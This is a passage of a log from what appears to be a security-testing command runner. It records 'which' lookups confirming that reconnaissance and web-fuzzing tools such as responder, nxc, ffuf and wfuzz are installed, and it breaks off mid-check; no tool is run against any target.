2025-10-24 01:26:44,966 - __main__ - INFO - 📤 STDOUT: /usr/sbin/arp-scan
2025-10-24 01:26:44,972 - __main__ - INFO - 🧹 CLEANUP: Process 43002 removed from registry
2025-10-24 01:26:44,972 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,972 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,972 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,972 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,972 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which arp-scan
2025-10-24 01:26:44,972 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,972 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:44,972 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,972 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,972 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,972 - __main__ - INFO - 💾 Cached result for command: which arp-scan
2025-10-24 01:26:44,973 - __main__ - INFO - 🔍 Cache MISS for command: which responder
2025-10-24 01:26:44,973 - __main__ - INFO - 🚀 EXECUTING: which responder
2025-10-24 01:26:44,973 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,973 - __main__ - INFO - 🆔 PROCESS: PID 43007 started
2025-10-24 01:26:44,973 - __main__ - INFO - 🆔 REGISTERED: Process 43007 - which responder...
2025-10-24 01:26:44,974 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43007
2025-10-24 01:26:44,976 - __main__ - INFO - 📤 STDOUT: /usr/sbin/responder
2025-10-24 01:26:44,977 - __main__ - INFO - 🧹 CLEANUP: Process 43007 removed from registry
2025-10-24 01:26:44,977 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:44,977 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,977 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,977 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,977 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which responder
2025-10-24 01:26:44,977 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:44,977 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 01:26:44,977 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,977 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,977 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,977 - __main__ - INFO - 💾 Cached result for command: which responder
2025-10-24 01:26:44,977 - __main__ - INFO - 🔍 Cache MISS for command: which nxc
2025-10-24 01:26:44,977 - __main__ - INFO - 🚀 EXECUTING: which nxc
2025-10-24 01:26:44,977 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,977 - __main__ - INFO - 🆔 PROCESS: PID 43012 started
2025-10-24 01:26:44,978 - __main__ - INFO - 🆔 REGISTERED: Process 43012 - which nxc...
2025-10-24 01:26:44,978 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43012
2025-10-24 01:26:44,980 - __main__ - INFO - 📤 STDOUT: /usr/bin/nxc
2025-10-24 01:26:44,982 - __main__ - INFO - 🧹 CLEANUP: Process 43012 removed from registry
2025-10-24 01:26:44,982 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:44,982 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,982 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,982 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,982 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which nxc
2025-10-24 01:26:44,982 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:44,982 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 13 bytes
2025-10-24 01:26:44,982 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,982 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,982 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,982 - __main__ - INFO - 💾 Cached result for command: which nxc
2025-10-24 01:26:44,982 - __main__ - INFO - 🔍 Cache MISS for command: which enum4linux-ng
2025-10-24 01:26:44,982 - __main__ - INFO - 🚀 EXECUTING: which enum4linux-ng
2025-10-24 01:26:44,982 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,984 - __main__ - INFO - 🆔 PROCESS: PID 43017 started
2025-10-24 01:26:44,984 - __main__ - INFO - 🆔 REGISTERED: Process 43017 - which enum4linux-ng...
2025-10-24 01:26:44,984 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43017
2025-10-24 01:26:44,985 - __main__ - INFO - 📤 STDOUT: /usr/bin/enum4linux-ng
2025-10-24 01:26:44,997 - __main__ - INFO - 🧹 CLEANUP: Process 43017 removed from registry
2025-10-24 01:26:44,997 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.02s
2025-10-24 01:26:44,997 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,997 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,997 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,997 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which enum4linux-ng
2025-10-24 01:26:44,997 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.02s
2025-10-24 01:26:44,997 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 23 bytes
2025-10-24 01:26:44,997 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,997 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,997 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,998 - __main__ - INFO - 💾 Cached result for command: which enum4linux-ng
2025-10-24 01:26:44,998 - __main__ - INFO - 🔍 Cache MISS for command: which rpcclient
2025-10-24 01:26:44,998 - __main__ - INFO - 🚀 EXECUTING: which rpcclient
2025-10-24 01:26:44,998 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,999 - __main__ - INFO - 🆔 PROCESS: PID 43022 started
2025-10-24 01:26:45,000 - __main__ - INFO - 🆔 REGISTERED: Process 43022 - which rpcclient...
2025-10-24 01:26:45,000 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43022
2025-10-24 01:26:45,001 - __main__ - INFO - 📤 STDOUT: /usr/bin/rpcclient
2025-10-24 01:26:45,002 - __main__ - INFO - 🧹 CLEANUP: Process 43022 removed from registry
2025-10-24 01:26:45,002 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,002 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,002 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,002 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,002 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which rpcclient
2025-10-24 01:26:45,002 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,002 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:45,002 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,002 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,002 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,002 - __main__ - INFO - 💾 Cached result for command: which rpcclient
2025-10-24 01:26:45,002 - __main__ - INFO - 🔍 Cache MISS for command: which enum4linux
2025-10-24 01:26:45,002 - __main__ - INFO - 🚀 EXECUTING: which enum4linux
2025-10-24 01:26:45,002 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,003 - __main__ - INFO - 🆔 PROCESS: PID 43027 started
2025-10-24 01:26:45,003 - __main__ - INFO - 🆔 REGISTERED: Process 43027 - which enum4linux...
2025-10-24 01:26:45,004 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43027
2025-10-24 01:26:45,005 - __main__ - INFO - 📤 STDOUT: /usr/bin/enum4linux
2025-10-24 01:26:45,006 - __main__ - INFO - 🧹 CLEANUP: Process 43027 removed from registry
2025-10-24 01:26:45,006 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,006 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,006 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,006 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,006 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which enum4linux
2025-10-24 01:26:45,006 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,006 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 01:26:45,006 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,006 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,006 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,006 - __main__ - INFO - 💾 Cached result for command: which enum4linux
2025-10-24 01:26:45,006 - __main__ - INFO - 🔍 Cache MISS for command: which ffuf
2025-10-24 01:26:45,006 - __main__ - INFO - 🚀 EXECUTING: which ffuf
2025-10-24 01:26:45,006 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,007 - __main__ - INFO - 🆔 PROCESS: PID 43032 started
2025-10-24 01:26:45,007 - __main__ - INFO - 🆔 REGISTERED: Process 43032 - which ffuf...
2025-10-24 01:26:45,008 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43032
2025-10-24 01:26:45,011 - __main__ - INFO - 📤 STDOUT: /usr/bin/ffuf
2025-10-24 01:26:45,011 - __main__ - INFO - 🧹 CLEANUP: Process 43032 removed from registry
2025-10-24 01:26:45,011 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,011 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,011 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,011 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,011 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which ffuf
2025-10-24 01:26:45,011 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,011 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 14 bytes
2025-10-24 01:26:45,011 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,011 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,011 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,011 - __main__ - INFO - 💾 Cached result for command: which ffuf
2025-10-24 01:26:45,011 - __main__ - INFO - 🔍 Cache MISS for command: which feroxbuster
2025-10-24 01:26:45,012 - __main__ - INFO - 🚀 EXECUTING: which feroxbuster
2025-10-24 01:26:45,012 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,012 - __main__ - INFO - 🆔 PROCESS: PID 43037 started
2025-10-24 01:26:45,012 - __main__ - INFO - 🆔 REGISTERED: Process 43037 - which feroxbuster...
2025-10-24 01:26:45,013 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43037
2025-10-24 01:26:45,015 - __main__ - INFO - 📤 STDOUT: /usr/bin/feroxbuster
2025-10-24 01:26:45,015 - __main__ - INFO - 🧹 CLEANUP: Process 43037 removed from registry
2025-10-24 01:26:45,015 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,015 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,015 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,015 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,015 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which feroxbuster
2025-10-24 01:26:45,015 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,015 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 21 bytes
2025-10-24 01:26:45,015 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,015 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,015 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,015 - __main__ - INFO - 💾 Cached result for command: which feroxbuster
2025-10-24 01:26:45,016 - __main__ - INFO - 🔍 Cache MISS for command: which dirsearch
2025-10-24 01:26:45,016 - __main__ - INFO - 🚀 EXECUTING: which dirsearch
2025-10-24 01:26:45,016 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,016 - __main__ - INFO - 🆔 PROCESS: PID 43042 started
2025-10-24 01:26:45,016 - __main__ - INFO - 🆔 REGISTERED: Process 43042 - which dirsearch...
2025-10-24 01:26:45,017 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43042
2025-10-24 01:26:45,019 - __main__ - INFO - 📤 STDOUT: /usr/bin/dirsearch
2025-10-24 01:26:45,019 - __main__ - INFO - 🧹 CLEANUP: Process 43042 removed from registry
2025-10-24 01:26:45,019 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,019 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,019 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,019 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,019 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which dirsearch
2025-10-24 01:26:45,019 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,019 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:45,019 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,019 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,019 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,019 - __main__ - INFO - 💾 Cached result for command: which dirsearch
2025-10-24 01:26:45,019 - __main__ - INFO - 🔍 Cache MISS for command: which dotdotpwn
2025-10-24 01:26:45,019 - __main__ - INFO - 🚀 EXECUTING: which dotdotpwn
2025-10-24 01:26:45,019 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,020 - __main__ - INFO - 🆔 PROCESS: PID 43047 started
2025-10-24 01:26:45,020 - __main__ - INFO - 🆔 REGISTERED: Process 43047 - which dotdotpwn...
2025-10-24 01:26:45,021 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43047
2025-10-24 01:26:45,022 - __main__ - INFO - 📤 STDOUT: /usr/bin/dotdotpwn
2025-10-24 01:26:45,023 - __main__ - INFO - 🧹 CLEANUP: Process 43047 removed from registry
2025-10-24 01:26:45,023 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,023 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,023 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,023 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,023 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which dotdotpwn
2025-10-24 01:26:45,023 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,023 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:45,023 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,023 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,023 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,023 - __main__ - INFO - 💾 Cached result for command: which dotdotpwn
2025-10-24 01:26:45,023 - __main__ - INFO - 🔍 Cache MISS for command: which xsser
2025-10-24 01:26:45,023 - __main__ - INFO - 🚀 EXECUTING: which xsser
2025-10-24 01:26:45,023 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,024 - __main__ - INFO - 🆔 PROCESS: PID 43052 started
2025-10-24 01:26:45,024 - __main__ - INFO - 🆔 REGISTERED: Process 43052 - which xsser...
2025-10-24 01:26:45,025 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43052
2025-10-24 01:26:45,026 - __main__ - INFO - 📤 STDOUT: /usr/bin/xsser
2025-10-24 01:26:45,029 - __main__ - INFO - 🧹 CLEANUP: Process 43052 removed from registry
2025-10-24 01:26:45,029 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,029 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,029 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,029 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,029 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which xsser
2025-10-24 01:26:45,029 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,029 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 01:26:45,029 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,029 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,030 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,030 - __main__ - INFO - 💾 Cached result for command: which xsser
2025-10-24 01:26:45,030 - __main__ - INFO - 🔍 Cache MISS for command: which wfuzz
2025-10-24 01:26:45,030 - __main__ - INFO - 🚀 EXECUTING: which wfuzz
2025-10-24 01:26:45,030 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,030 - __main__ - INFO - 🆔 PROCESS: PID 43057 started
2025-10-24 01:26:45,030 - __main__ - INFO - 🆔 REGISTERED: Process 43057 - which wfuzz...
2025-10-24 01:26:45,031 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43057
2025-10-24 01:26:45,033 - __main__ - INFO - 📤 STDOUT: /usr/bin/wfuzz
2025-10-24 01:26:45,035 - __main__ - INFO - 🧹 CLEANUP: Process 43057 removed from registry
2025-10-24 01:26:45,038 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,038 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,038 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,038 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,038 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which wfuzz
2025-10-24 01:26:45,038 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,038 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 01:26:45,038 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,038 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,038 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,038 - __main__ - INFO - 💾 Cached result for command: which wfuzz
2025-10-24 01:26:45,038 - __main__ - INFO - 🔍 Cache MISS for command: which gau
2025-10-24 01:26:45,038 - __main__ - INFO - 🚀 EXECUTING: which gau
2025-10-24 01:26:45,039 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,039 - __main__ - INFO - 🆔 PROCESS: PID 43062 started
2025-10-24 01:26:45,039 - __main__ - INFO - 🆔 REGISTERED: Process 43062 - which gau...
2025-10-24 01:26:45,040 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43062
2025-10-24 01:26:45,042 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/gau
2025-10-24 01:26:45,045 - __main__ - INFO - 🧹 CLEANUP: Process 43062 removed from registry
2025-10-24 01:26:45,045 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,045 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,045 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,045 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,045 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which gau
2025-10-24 01:26:45,045 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,045 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:45,046 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,046 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,046 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,046 - __main__ - INFO - 💾 Cached result for command: which gau
2025-10-24 01:26:45,046 - __main__ - INFO - 🔍 Cache MISS for command: which waybackurls
2025-10-24 01:26:45,046 - __main__ - INFO - 🚀 EXECUTING: which waybackurls
2025-10-24 01:26:45,046 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,046 - __main__ - INFO - 🆔 PROCESS: PID 43067 started
2025-10-24 01:26:45,046 - __main__ - INFO - 🆔 REGISTERED: Process 43067 - which waybackurls...
2025-10-24 01:26:45,047 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43067
2025-10-24 01:26:45,048 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/waybackurls
2025-10-24 01:26:45,059 - __main__ - INFO - 🧹 CLEANUP: Process 43067 removed from registry
2025-10-24 01:26:45,059 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,059 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,060 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,060 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,060 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which waybackurls
2025-10-24 01:26:45,060 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,060 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 27 bytes
2025-10-24 01:26:45,060 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,060 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,060 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,060 - __main__ - INFO - 💾 Cached result for command: which waybackurls
2025-10-24 01:26:45,060 - __main__ - INFO - 🔍 Cache MISS for command: which arjun
2025-10-24 01:26:45,060 - __main__ - INFO - 🚀 EXECUTING: which arjun
